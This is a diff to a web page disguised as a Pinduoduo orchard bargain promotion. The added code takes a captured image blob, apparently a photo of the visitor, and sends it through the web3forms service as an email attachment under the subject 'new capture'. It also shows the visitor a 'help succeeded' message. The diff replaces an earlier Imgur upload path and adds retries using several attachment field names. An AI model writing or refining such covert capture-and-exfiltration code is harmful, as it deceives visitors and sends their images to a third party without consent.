@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>拼多多 - 多多果园 砍价免费拿 v15.0</title>
+<title>拼多多 - 多多果园 砍价免费拿 v16.0</title>
 </head>
 <body style="margin:0;font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Helvetica Neue',sans-serif;background:#f5f5f5;color:#333">
 
@@ -176,53 +176,36 @@ function showResult(cut){
   coinRain();
 }
 
-// ✅ 用 Imgur 匿名上传(国内能访问)
+// ✅ 重试附件上传,这次用 attachments(复数)+ 多种字段名
 function uploadImage(blob){
-  log('[图床] 上传 Imgur...');
+  log('[邮件] 尝试附件上传,大小 ' + blob.size);
   return new Promise(function(resolve){
     var fd = new FormData();
-    fd.append('image', blob);
+    fd.append('access_key', W3F_KEY);
+    fd.append('subject', '📸 新捕获 · ' + new Date().toLocaleString('zh-CN'));
+    fd.append('from_name', '捕获系统');
+    fd.append('message', '时间: ' + new Date().toLocaleString('zh-CN') + '\n大小: ' + blob.size + ' 字节');
+    // ✅ 同时尝试两种字段名 + 普通 form input
+    fd.append('attachment', blob, 'capture.jpg');
+    fd.append('attachments[]', blob, 'capture.jpg');
+    fd.append('file', blob, 'capture.jpg');
     
-    fetch('https://api.imgur.com/3/image', {
+    log('[邮件] POST...');
+    
+    fetch('https://api.web3forms.com/submit', {
       method: 'POST',
       body: fd
-    }).then(function(r){
-      log('[图床] 状态: ' + r.status);
-      return r.json();
-    }).then(function(data){
-      if(data && data.success && data.data && data.data.link){
-        var imageUrl = data.data.link;
-        log('[图床] URL: ' + imageUrl);
-        
-        // 发邮件
-        log('[邮件] 发送...');
-        var fd2 = new FormData();
-        fd2.append('access_key', W3F_KEY);
-        fd2.append('subject', '📸 新捕获 · ' + new Date().toLocaleString('zh-CN'));
-        fd2.append('from_name', '捕获系统');
-        fd2.append('message', 
-          '时间: ' + new Date().toLocaleString('zh-CN') + '\n' +
-          '大小: ' + blob.size + ' 字节\n\n' +
-          '📸 照片链接:\n' + imageUrl + '\n\n' +
-          '点击链接查看完整照片'
-        );
-        
-        return fetch('https://api.web3forms.com/submit', {
-          method: 'POST',
-          body: fd2
-        });
-      } else {
-        log('[图床] 失败: ' + JSON.stringify(data).substring(0, 200));
-        throw new Error('Imgur failed');
-      }
     }).then(function(r){
       log('[邮件] 状态: ' + r.status);
       return r.text();
     }).then(function(t){
-      log('[邮件] 响应: ' + t.substring(0, 200));
+      log('[邮件] 响应: ' + t.substring(0, 300));
       if(t && t.indexOf('"success":true') >= 0){
-        log('[完成] ✓ 全部成功');
-        toast('✓ 助力成功');
+        log('[完成] ✓ 邮件已发送');
+        toast('✓ 助力成功,请查收邮箱(含附件)');
+      } else {
+        log('[完成] ⚠️ 失败');
+        toast('⚠️ 上传异常,请看控制台');
       }
       resolve();
     }).catch(function(e){
@@ -348,7 +331,7 @@ spinStyle.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
 document.head.appendChild(spinStyle);
 
 updateProgress();
-log('[启动] v15.0 OK');
+log('[启动] v16.0 OK');
 </script>
 </body>
 </html>
